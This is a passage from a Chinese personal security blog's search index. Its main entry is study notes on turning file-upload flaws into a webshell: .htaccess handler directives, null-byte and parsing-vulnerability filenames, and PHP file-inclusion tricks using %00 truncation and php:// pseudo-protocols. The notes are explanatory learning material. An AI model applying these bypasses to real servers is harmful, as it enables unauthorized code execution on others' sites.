      <content type="html"><![CDATA[<h3 id="从文件上传到getshell"><a href="#从文件上传到getshell" class="headerlink" title="从文件上传到getshell"></a>从文件上传到getshell</h3><p>一般找到文件上传页面，常规getshell思路:<br>先检查服务器验证上传文件的逻辑，再想办法绕过</p><blockquote><ul><li>前台js验证——禁用js，burpsuit抓包绕过即可</li><li>后台检查MIME——抓包改MIME</li><li>后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传</li><li>.hatccess上传(apache)——创建一个.hatccseea文件<br>设置命名有”php.gif”的文件当作php文件解析执行：<pre><code>&lt;FilesMatch “php.gif”&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre>上传的jpg文件都会以php格式解析：<pre><code>AddType    application/x-httpd-php    .jpg</code></pre></li></ul></blockquote><blockquote><ul><li>后台检查文件后缀名——</li><li>0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)<pre><code>1.php .png(空格改为00)</code></pre></li><li>IIS6.0解析漏洞<pre><code>文件      xxx.asp;.jpg (服务器默认不解析;号后面的内容)文件夹    xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件)</code></pre></li><li>apache解析漏洞<pre><code>www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析)</code></pre></li><li>iis7.0和nginx解析漏洞<pre><code>www.xxx.com/logo.jpg/*.php(开启fix_pathinfo)</code></pre></li></ul></blockquote><h3 id="文件包含漏洞和利用"><a href="#文件包含漏洞和利用" class="headerlink" title="文件包含漏洞和利用"></a>文件包含漏洞和利用</h3><blockquote><ul><li>如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞</li><li>通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00</li><li>文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)</li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title></title>
      <link href="/404.html"/>
      <url>/404.html</url>
      <content type="html"><![CDATA[<!DOCTYPE HTML><html><head>  <meta http-equiv="content-type" content="text/html;charset=utf-8;">  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">  <meta name="robots" content="all">  <meta name="robots" content="index,follow">  <link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"></head><body>  <script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homepageurl="/" homepagename="回到我的主页">  </script>  <script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"></script>  <script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"></script></body></html>]]></content>
    </entry>
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      <content type="html"><![CDATA[<p>hi,man</p>]]></content>
    </entry>
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      <content type="html"><![CDATA[<p>本着分享即学习的原则，本菜最近新搭建了博客。（⊙.⊙）</p><p>一方面是记录一下平时学习中遇到一些问题和想法；另一方面算是激励自己学习的一个动力。(ง •̀_•́)ง (*•̀ㅂ•́)و</p><p>如有错误还请各位师傅批评指正。(´･◡･`)</p>]]></content>
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
  
</search>
